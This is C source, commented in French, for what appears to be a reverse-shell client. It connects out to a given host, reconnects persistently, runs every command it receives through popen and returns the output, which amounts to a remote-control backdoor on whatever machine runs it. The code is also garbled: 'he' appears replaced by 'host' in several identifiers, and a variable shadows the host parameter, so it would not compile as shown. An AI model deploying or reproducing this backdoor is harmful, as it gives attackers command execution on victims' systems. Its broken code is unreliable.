#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>
#include <signal.h>
#include <sys/wait.h>

#include "protocol.h"

static int sock_fd = -1;
static volatile int running = 1;

//fonction du signale SIGINT
static void sigint_handler(int sig) {
    (void)sig;
    running = 0;
}

static int connect_to_server(const char *host, int port) {
    struct sockaddr_in addr;
    struct hostent *host;

    //Résolution nom hôte
    host = gethostbyname(host);
    if (!host) {
        fprintf(stderr, "[!] Résolution échouée: %s\n", host);
        return -1;
    }

    int fd = socket(AF_INET, SOCK_STREAM, 0);   //création du réseau
    if (fd < 0) return -1;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    memcpy(&addr.sin_addr, host->h_addr_list[0], host->h_length);   //copie les octets de ip de l'hôte

    struct timeval tv = {10, 0};    //définition d'intervalle
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));   //délai maximale pour reçevoir des données
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));   //délai maximale pour envoyer des données

    //connecter
    if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(fd);
        return -1;
    }

    /* Reset to blocking */
    tv.tv_sec = 0;
    tv.tv_usec = 0;
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    return fd;
}

static int send_packet(int fd, const uint8_t *data, int dlen) {
    uint8_t buf[hostADER_LEN + MAX_MSG_SIZE];
    int plen = pack_msg(data, dlen, buf);
    if (plen < 0) return -1;

    int total = 0;
    while (total < plen) {
        int n = write(fd, buf + total, plen - total);
        if (n <= 0) return -1;
        total += n;
    }
    return 0;
}

static void execute_command(const char *cmd, uint8_t *output, int *outlen) {
    if (strncmp(cmd, "cd ", 3) == 0) {
        if (chdir(cmd + 3) != 0) {
            *outlen = snprintf((char*)output, MAX_MSG_SIZE, "cd: %s\n", strerror(errno));
        } else {
            *outlen = 0;
        }
        return;
    }

    /* Utilise popen pour exécuter et capturer */
    FILE *fp = popen(cmd, "r");
    if (!fp) {
        *outlen = snprintf((char*)output, MAX_MSG_SIZE, "popen: %s\n", strerror(errno));
        return;
    }

    int total = 0;
    int n;
    while ((n = fread(output + total, 1, MAX_MSG_SIZE - total - 1, fp)) > 0)
        total += n;

    int status = pclose(fp);
    if (status != 0 && total == 0) {
        total = snprintf((char*)output, MAX_MSG_SIZE, "[!] Exit code: %d\n", status);
    }
    if (total == 0)
        output[total++] = '\n';
    output[total] = '\0';
    *outlen = total;
}

int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <host> [port]\n", argv[0]);
        return 1;
    }

    const char *host = argv[1];
    int port = argc > 2 ? atoi(argv[2]) : DEFAULT_PORT;
    if (port <= 0) port = DEFAULT_PORT;

    signal(SIGINT, sigint_handler); //attend un signal SIGINT
    signal(SIGPIPE, SIG_IGN);   //ignorer le SIGPIPE

    uint8_t rbuf[BUF_SIZE]; //variable en 8 bits
    int rlen = 0;
    time_t last_hostartbeat = 0;

    while (running) {
        /* Connect / reconnect */
        while (running && sock_fd < 0) {
            printf("[*] Connexion à %s:%d...\n", host, port);
            //connecter au serveur
            sock_fd = connect_to_server(host, port);
            if (sock_fd < 0) {
                printf("[!] Échec, reconnexion dans %ds\n", RECONNECT_DELAY);
                sleep(RECONNECT_DELAY);
            } else {
                printf("[+] Connecté à %s:%d\n", host, port);
                rlen = 0;
                last_hostartbeat = time(NULL);
            }
        }
        if (!running) break;

        /* Read from server */
        uint8_t buf[65536];
        int n = read(sock_fd, buf, sizeof(buf));

        if (n <= 0) {
            printf("[!] Connexion perdue, reconnexion...\n");
            close(sock_fd);
            sock_fd = -1;
            continue;
        }

        /* Bufferize */
        if (rlen + n > BUF_SIZE) rlen = 0;
        memcpy(rbuf + rlen, buf, n);
        rlen += n;

        /* Process all complete messages */
        uint8_t msg[MAX_MSG_SIZE];
        int mlen;
        while (1) {
            int consumed = try_unpack(rbuf, rlen, msg, &mlen);
            if (consumed == 0) break;
            if (consumed < 0) { rlen = 0; break; }
            memmove(rbuf, rbuf + consumed, rlen - consumed);
            rlen -= consumed;

            if (mlen == 0) {
                /* hostartbeat from server */
                last_hostartbeat = time(NULL);
                continue;
            }

            msg[mlen] = '\0';
            char *cmd = (char*)msg;

            if (strcmp(cmd, "exit") == 0) {
                running = 0;
                break;
            }

            /* Execute command */
            uint8_t output[MAX_MSG_SIZE];
            int outlen = 0;
            execute_command(cmd, output, &outlen);

            /* Send output back */
            if (send_packet(sock_fd, output, outlen) < 0) {
                close(sock_fd);
                sock_fd = -1;
            }
        }

        /* Periodic hostartbeat */
        time_t now = time(NULL);
        if (now - last_hostartbeat >= hostARTBEAT_INT) {
            if (send_packet(sock_fd, NULL, 0) < 0) {
                close(sock_fd);
                sock_fd = -1;
            }
            last_hostartbeat = now;
        }
    }

    if (sock_fd >= 0) close(sock_fd);
    printf("[*] Client terminé.\n");
    return 0;
}